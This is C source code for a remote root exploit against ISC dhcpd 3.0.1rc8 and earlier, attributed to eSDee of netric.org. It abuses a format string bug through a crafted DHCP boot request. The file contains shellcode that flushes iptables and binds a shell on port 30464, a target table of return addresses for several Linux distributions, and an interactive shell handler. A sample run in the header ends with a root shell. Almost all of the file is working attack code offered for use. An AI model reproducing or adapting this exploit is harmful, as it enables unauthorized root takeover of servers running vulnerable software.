/* ISC dhcpd 3.0.1 < remote root exploit - by eSDee (esdee@netric.org)
   -------------------------------------------------------------------

   ISC dhcpd 3.0.1rc8 and prior contains a format string vulnerability
   in ./common/print.c on line 1368:

   if (errorp)
        log_error (obuf);
   else
        log_info (obuf);

   This can be remotely exploited by sending a DHCP boot request packet
   with the DHCP_HOST option set. Version RC5 to RC8 doesn't support
   ddns-update-style ad-hoc, so you have to trigger the vulnerable
   function on another way. This exploit is only tested against 3.0.1rc4
   and prior, however, the offsets might work on RC5 and higher.

   Example:
   [esdee@pant0ffel] ./dhcp-expl -t4 -i 10.0.0.1 10.0.0.7
   ISC dhcpd 3.0.1 < remote root exploit - by eSDee (esdee@netric.org)
   -------------------------------------------------------------------
   + OS    : Redhat 8.0
   + type  : dhcp-3.0.1rc1/rc4
   + retloc: 0x080ce2a8
   + ret   : 0xbffff2fc
   + sending boot request packet to 10.0.0.7 ...
   + Exploit successful!
   -------------------------------------------------------------------
   Linux flopppp 2.4.18-14 #1 Wed Sep 4 12:13:11 EDT 2002 i686 athlon 
   uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(ad
   exit;

   More information available at:
   http://www.cert.org/advisories/CA-2002-12.html

   Have fun! :)
*/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <getopt.h>

#define DHCP_BOOTREQUEST 1
#define DHCP_BOOTREPLY   2

/* DHCP Messages */
#define DHCP_DISCOVER 1
#define DHCP_OFFER    2
#define DHCP_REQUEST  3
#define DHCP_DECLINE  4
#define DHCP_ACK      5
#define DHCP_NACK     6
#define DHCP_RELEASE  7

/* DHCP Options */
#define DHCP_OPTION_PAD    0
#define DHCP_SUBNET        1
#define DHCP_GATEWAY       3
#define DHCP_DNS           6
#define DHCP_HOST          12
#define DHCP_DOMAIN_NAME   15
#define DHCP_NETMASK       28
#define DHCP_REQUESTED_IP  50
#define DHCP_LEASE         51
#define DHCP_MESSAGE       53
#define DHCP_SERVER        54
#define DHCP_PARAMETERS    55
#define DHCP_FQDN          81
#define DHCP_OPTION_END    255

char shellcode[] =
        /* /sbin/iptables --flush */
        "\x31\xc0\x31\xdb\xb0\x02\xcd\x80"
        "\x39\xd8\x75\x2d\x31\xc0\x50\x66"
        "\x68\x2d\x46\x89\xe6\x50\x68\x62"
        "\x6c\x65\x73\x68\x69\x70\x74\x61"
        "\x68\x62\x69\x6e\x2f\x68\x2f\x2f"
        "\x2f\x73\x89\xe3\x8d\x54\x24\x10"
        "\x50\x56\x54\x89\xe1\xb0\x0b\xcd"
        "\x80\x89\xc3\x31\xc0\x31\xc9\x31"
        "\xd2\xb0\x07\xcd\x80"

        /* bindcode (port 30464) by ilja (ilja@netric.org) */
        "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\xb1\x06\x51"
        "\xb1\x01\x51\xb1\x02\x51\x8d\x0c\x24\xcd\x80\xb3\x02\xb1\x02\x31"
        "\xc9\x51\x51\x51\x80\xc1\x77\x66\x51\xb1\x02\x66\x51\x8d\x0c\x24"
        "\xb2\x10\x52\x51\x50\x8d\x0c\x24\x89\xc2\x31\xc0\xb0\x66\xcd\x80"
        "\xb3\x01\x53\x52\x8d\x0c\x24\x31\xc0\xb0\x66\x80\xc3\x03\xcd\x80"
        "\x31\xc0\x50\x50\x52\x8d\x0c\x24\xb3\x05\xb0\x66\xcd\x80\x89\xc3"
        "\x31\xc9\x31\xc0\xb0\x3f\xcd\x80\x41\x31\xc0\xb0\x3f\xcd\x80\x41"
        "\x31\xc0\xb0\x3f\xcd\x80\x31\xdb\x53\x68\x6e\x2f\x73\x68\x68\x2f"
        "\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x31\xc9\x51\x53\x8d\x0c\x24"
        "\x31\xc0\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";

struct {
        char *distro;
        char *type;
        unsigned long retloc;
        unsigned long ret;
        unsigned long pops;
        unsigned long pad;
        unsigned long written;
} targets[] = { /* Thanks marshal and uuuppzz ;) */
        { "Debian 3.0  ", "dhcp-3.0.1rc1/rc4", 0x080d61e0, 0xbffff344, 16, 0, 0xE2 }, /* GOT entry of fprintf */
        { "Debian 3.0  ", "dhcp-3.0rc1/rc9  ", 0x080d61e0, 0xbffff2fc, 16, 0, 0xE2 },
	{ "Mandrake 8.1", "dhcp-3.0.1rc1/rc4", 0x080d57d8, 0xbffff24c, 16, 0, 0xE2 },
	{ "Mandrake 8.1", "dhcp-3.0rc1/rc9  ", 0x080d57d8, 0xbffff24c, 16, 0, 0xE2 },
        { "Mandrake 8.1", "dhcp-3.0b2pl23   ", 0x080bc124, 0xbffff24c, 14, 2, 0xD0 },
        { "Redhat 8.0  ", "dhcp-3.0.1rc1/rc4", 0x080ce2a8, 0xbffff2fc, 16, 0, 0xE2 },
        { "Redhat 8.0  ", "dhcp-3.0rc1/rc9  ", 0x080cd2a8, 0xbffff2fc, 16, 0, 0xE2 },
	{ "Redhat 8.0  ", "dhcp-3.0b2pl24   ", 0x080ca228, 0xbffff2fc, 16, 0, 0xE2 },
        { "Redhat 7.3  ", "dhcp-3.0.1rc1/rc4", 0x080d11e0, 0xbffff344, 16, 0, 0xE2 },
        { "Redhat 7.3  ", "dhcp-3.0rc1/rc9  ", 0x080d11e0, 0xbffff2fc, 16, 0, 0xE2 },
        { "Redhat 7.2  ", "dhcp-3.0.1rc1/rc4", 0x080d1ff8, 0xbffff344, 16, 0, 0xE2 },
        { "Redhat 7.2  ", "dhcp-3.0rc1/rc9  ", 0x080d1c78, 0xbffff2fc, 16, 0, 0xE2 },
        { "SuSE 8.1    ", "dhcp-3.0.1rc1/rc4", 0x080ce2a8, 0xbfffe520, 16, 0, 0xE2 },
        { "SuSE 7.3    ", "dhcp-3.0.1rc1/rc4", 0x080d8720, 0xbfffe490, 16, 0, 0xE2 },
        { "SuSE 7.3    ", "dhcp-3.0rc1/rc9  ", 0x080d8720, 0xbfffe560, 16, 0, 0xE2 },
        { "Crash       ", "(All platforms)  ", 0xBADe5Dee, 0xb0efb0ef, 16, 0, 0xE2 },
};

typedef struct {
        u_int8_t        op;
        u_int8_t        htype;
        u_int8_t        hlen;
        u_int8_t        hops;
        u_int32_t       xid;
        u_int16_t       secs;
        u_int16_t       flags;
        u_int32_t       ciaddr;
        u_int32_t       yiaddr;
        u_int32_t       siaddr;
        u_int32_t       giaddr;
        u_int8_t        chaddr[16];
        u_int8_t        sname[64];
        u_int8_t        file[128];
        u_int32_t       cookie;
        u_int8_t        options[308];
} DHCP;

void
usage(char *prog)
{
        fprintf(stderr, "Usage: %s [-i ipaddress] [-p port] <-t type> <host>\n"
                        "       %s -i 192.168.0.1 -p 67 -t3 192.168.0.4\n\n"
                        "\t-t0 will display a list of all the available targets.\n", prog, prog);

        exit(1);
}

int
padding(int write_byte, int already_written)
{
        int padding;
        write_byte += 0x100;
        already_written %= 0x100;
        padding = (write_byte - already_written) % 0x100;
        if (padding < 10) padding += 0x100;
        return padding;
}

void
shell(int sock)
{
        fd_set  fd_read;
        char buff[1024], *cmd="/bin/uname -a;/usr/bin/id;cd /;\n";
        int n;

        FD_ZERO(&fd_read);
        FD_SET(sock, &fd_read);
        FD_SET(0, &fd_read);

        send(sock, cmd, strlen(cmd), 0);

        while(1) {
                FD_SET(sock, &fd_read);
                FD_SET(0,    &fd_read);

                if (select(sock+1, &fd_read, NULL, NULL, NULL) < 0) break;

                if (FD_ISSET(sock, &fd_read)) {
                        if ((n = recv(sock, buff, sizeof(buff), 0)) < 0){
                                fprintf(stderr, "EOF\n");
                                exit(2);
                        }

                        if (write(1, buff, n) <0) break;
                }

                if (FD_ISSET(0, &fd_read)) {
                        if ((n = read(0, buff, sizeof(buff))) < 0){
                                fprintf(stderr,"EOF\n");
                                exit(2);
                        }

                        if (send(sock, buff, n, 0) < 0) break;
                }

                usleep(10);
        }

        fprintf(stderr,"Connection lost.\n\n");
        exit(0);
}

int
main(int argc, char *argv[])
{
        char buffer     [1400];
        char nops       [1000];
        char fmt        [1024];
        char writecode  [256];
        char padbuf	[40];
        char ip_address [32] = "192.168.0.1";

        DHCP *dhcp_message;

        struct hostent *hp;
        struct sockaddr_in dest;

        int sock        = 0;
        int i           = 0;
        int opt         = 0;
        int port        = 67;
        int type        = 0;
        int alw         = 0;
        int tmp         = 0;

        fprintf(stdout, "ISC dhcpd 3.0.1 < remote root exploit - by eSDee (esdee@netric.org)\n"
                        "-------------------------------------------------------------------\n");

        while((opt = getopt(argc,argv,"i:p:t:")) != EOF) {
                switch(opt) {
                        case 'i':
                                memset(ip_address, 0x0, sizeof(ip_address));
                                strncpy(ip_address, optarg, sizeof(ip_address) - 1);
                                break;
                        case 'p':
                                port=atoi(optarg);
                                if ((port <= 0) || (port > 65535)) {
                                        fprintf(stderr,"Invalid port.\n");
                                        return -1;
                                }
                                break;
                        case 't':
                                type = atoi(optarg);
                                if (type == 0 || type > sizeof(targets) / 28) {
                                        for(i = 0; i < sizeof(targets) / 28; i++)
                                        fprintf(stderr, "%02d. %s - %s      [0x%08x - 0x%08x]\n",
                                                i + 1, targets[i].distro, targets[i].type, targets[i].retloc, targets[i].ret);
                                        return -1;
                                }
                                break;
                        default:
                                usage(argv[0] == NULL ? "dhcp-expl" : argv[0]);
                                break;
                }

        }

        if (argv[optind] == NULL || type == 0) usage(argv[0] == NULL ? "dhcp-expl" : argv[0]);

        if ((hp = gethostbyname(argv[optind])) == NULL) {
                fprintf(stderr, "Unable to resolve %s...\n", argv[optind]);
                return -1;
        }

        memset((char *)&dest, 0x0, sizeof(dest));
        memcpy((char *)&dest.sin_addr, hp->h_addr, hp->h_length);

        dest.sin_family = AF_INET;
        dest.sin_port   = htons(port);

        if ((sock = socket(AF_INET, SOCK_DGRAM, 17)) < 0) {
                fprintf(stderr, "Socket error.\n");
                return -1;
        }

        fprintf(stdout, "+ OS    : %s\n"
                        "+ type  : %s\n"
                        "+ retloc: 0x%08x\n"
                        "+ ret   : 0x%08x\n",
                        targets[type - 1].distro, targets[type - 1].type, targets[type - 1].retloc, targets[type - 1].ret);

        fprintf(stdout, "+ sending boot request packet to %s ... \n", inet_ntoa(*((struct in_addr*)hp->h_addr)));

        memset(buffer, 0x00, sizeof(buffer));
        memset(fmt,    0x41, sizeof(fmt));
        memset(nops,   0x90, sizeof(nops));
        memset(padbuf, 0x41, sizeof(padbuf));
        
        memcpy(nops + 770, shellcode, sizeof(shellcode) - 1);

        dhcp_message = (DHCP *)buffer;
        dhcp_message->op         = DHCP_BOOTREQUEST;
        dhcp_message->htype      = 0x01;                // ethernet
        dhcp_message->hlen       = 0x06;
        dhcp_message->hops       = 0x00;
        dhcp_message->secs       = 0x00;
        dhcp_message->cookie     = 0x63538263;          // DHCP_MAGIC
        dhcp_message->ciaddr     = inet_addr(ip_address);
        dhcp_message->yiaddr     = inet_addr(ip_address);
        dhcp_message->siaddr     = inet_addr(ip_address);
        dhcp_message->giaddr     = inet_addr(ip_address);
        dhcp_message->options[1] = DHCP_HOST;
        dhcp_message->options[2] = 0xFF;

        for(i = 0; i < 32; i += 8) {
                fmt[i + 0] = (targets[type - 1].retloc + (i / 8) & 0x000000ff);
                fmt[i + 1] = (targets[type - 1].retloc & 0x0000ff00) >> 8;
                fmt[i + 2] = (targets[type - 1].retloc & 0x00ff0000) >> 16;
                fmt[i + 3] = (targets[type - 1].retloc & 0xff000000) >> 24;
        }

        fmt[32] = 0x00;

        for (i = 0; i < targets[type - 1].pops; i++) strncat(fmt,"%08x.", sizeof(fmt) - strlen(fmt) - 1);
        
	for (i = targets[type - 1].pad; i < 32 + targets[type - 1].pad; i += 4) {
		padbuf[i + 0] = 0xef;	/* just a valid pointer (0xbfffb0ef), */
		padbuf[i + 1] = 0xb0;	/* to avoid a segfault. */
		padbuf[i + 2] = 0xff;
		padbuf[i + 3] = 0xbf;
	}
	
	padbuf[32] = 0x00;
        strncat(fmt,padbuf, sizeof(fmt) - strlen(fmt) - 1);

        for (i = 0; i <= 24; i += 8) {
                tmp = padding((targets[type - 1].ret >> i) & 0xff, targets[type - 1].written) + 10;
                snprintf(writecode, sizeof(writecode) - 1, "%%%du%%n", tmp);
                strncat(fmt, writecode, sizeof(fmt) - strlen(fmt) - 1);
                targets[type - 1].written += tmp;
        }

        strncat(fmt,"%08x.%08x.%08x.%08x.", sizeof(fmt) - strlen(fmt) - 1);
        memcpy(&dhcp_message->options[3], fmt, strlen(fmt));

        /* The formatstring looks something like:
           [retloc][dummy][retloc++][dummy][retloc++][dummy][retloc++][dummy][16 stackpops]
           [valid stack address][dummy][dummy][writecode][4 stackpops] */

        if (sendto(sock, nops, sizeof(nops), 0, (struct sockaddr *) &dest, sizeof(dest)) < 0) {
                fprintf(stderr, "Sendto error.\n");
                return -1;
        }

        if (sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr *) &dest, sizeof(dest)) < 0) {
                fprintf(stderr, "Sendto error.\n");
                return -1;
        }

        close(sock);
        sleep(2);

        if ((sock = socket(AF_INET, SOCK_STREAM, 6)) < 0) {
                fprintf(stderr, "Socket error.\n");
                return -1;
        }

        dest.sin_family = AF_INET;
        dest.sin_port   = htons(30464);

        if(connect(sock, (struct sockaddr *)&dest, sizeof(dest)) == -1) {
                fprintf(stderr, "+ Exploit failed!\n");
                return -1;
        }

        fprintf(stdout, "+ Exploit successful!\n"
                        "-------------------------------------------------------------------\n");
        shell(sock);
        close(sock);
        return  0;
}

/* EOF */
